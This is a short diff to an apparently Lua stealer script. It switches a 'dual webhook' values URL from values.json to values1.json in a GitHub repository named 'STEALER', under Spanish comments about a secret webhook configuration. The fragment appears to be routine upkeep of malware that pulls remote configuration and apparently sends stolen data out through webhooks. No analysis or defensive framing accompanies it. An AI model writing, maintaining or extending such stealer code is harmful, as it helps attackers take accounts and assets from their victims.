@@ -15,7 +15,7 @@ local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/mai
 -- ==========================================
 -- URL DE VALORES EXCLUSIVA PARA DUAL WEBHOOK
 -- ==========================================
-local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
+local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values1.json"
 
 -- ==========================================
 -- CONFIGURACIÓN SECRETA DUAL WEBHOOK
